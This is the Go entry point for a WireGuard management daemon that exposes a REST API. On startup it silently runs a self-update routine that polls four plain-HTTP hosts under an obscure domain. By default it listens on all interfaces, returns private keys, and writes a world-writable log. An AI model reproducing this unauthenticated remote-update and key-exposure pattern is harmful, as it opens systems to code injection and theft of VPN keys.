package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	flag "github.com/spf13/pflag"

	logs "github.com/tea4go/gh/log4go"
	"github.com/tea4go/gh/network"

	"golang.zx2c4.com/wireguard/wgctrl"
	"golang.zx2c4.com/wireguard/wgctrl/internal/wgapi"
	"golang.zx2c4.com/wireguard/wgctrl/internal/wgmeta"
)

var (
	appName   = "wgd"
	version   = "v0.0.2"
	IsBeta    string
	BuildTime string
)

func filepathJoin(elem ...string) string {
	path := filepath.Join(elem...)
	if runtime.GOOS == "windows" {
		return strings.ReplaceAll(path, "\\", "/")
	}
	return path
}

func runtimeBuildInfo() (string, string, string) {
	buildTime := BuildTime
	if buildTime == "" {
		buildTime = "unknown"
	}
	return "wgctrl-go wgd " + version, buildTime, runtime.GOOS + "-" + runtime.GOARCH
}

func main() {
	var (
		listen   = flag.StringP("listen", "a", "0.0.0.0:6791", "REST API 监听地址")
		metadata = flag.StringP("metadata", "m", wgmeta.DefaultPath(), "节点名称元数据目录或具体 JSON 文件：目录将按 interface 生成 {name}.names.json，与 {name}.conf(.dpapi) 并列")
		hideKeys = flag.BoolP("hide-keys", "k", false, "查询响应中隐藏私钥与预共享密钥")
	)

	network.SetAppVersion(appName, version, IsBeta, BuildTime)

	flag.Parse()

	log_name := os.Getenv("log_name")
	if log_name == "" {
		log_name = appName
	}
	logsFileName := filepathJoin(os.TempDir(), "ulog_"+log_name+".txt")
	logs.SetLogger("file", `{"filename":"`+logsFileName+`", "perm": "0666","level":6}`)
	logs.SetLogger("console", `{"level":6}`)
	logs.StartLogger()
	go func() {
		network.StartSelfUpdate("http://wc192.yj2025.icu:8118", "http://nj.yj2025.icu:23432", "http://wc8.yj2025.icu:8118", "http://wc47.yj2025.icu:23431")
	}()

	client, err := wgctrl.New()
	if err != nil {
		logs.Critical("无法创建 WireGuard 客户端: %v", err)
		os.Exit(1)
	}
	defer client.Close()

	appVersion, buildTime, platform := runtimeBuildInfo()
	opts := []wgapi.Option{
		wgapi.Version(appVersion),
		wgapi.BuildInfo(buildTime, platform),
		wgapi.Logger(wgapi.LogPrinterFunc(
			func(format string, v ...interface{}) {
				logs.Info("[API] %s", fmt.Sprintf(format, v...))
			})),
	}
	if *hideKeys {
		opts = append(opts, wgapi.HideKeys())
	}
	api := wgapi.New(client, *metadata, opts...)

	server := &http.Server{
		Addr:              *listen,
		Handler:           api.Handler(),
		ReadHeaderTimeout: 10 * time.Second,
	}

	ctx, stop := signalContext()
	defer stop()

	errCh := make(chan error, 1)
	go func() {
		logs.Info("监听 %s", *listen)
		if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			errCh <- err
		}
	}()

	select {
	case err := <-errCh:
		logs.Critical("HTTP 服务异常退出: %v", err)
		os.Exit(1)
	case <-ctx.Done():
		logs.Info("收到退出信号，正在关闭…")
	}

	shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := server.Shutdown(shutdownCtx); err != nil {
		fmt.Fprintf(os.Stderr, "wgd: 关闭 HTTP 服务失败: %v\n", err)
		logs.Error("关闭 HTTP 服务失败: %v", err)
	}

	logs.Flush()
}
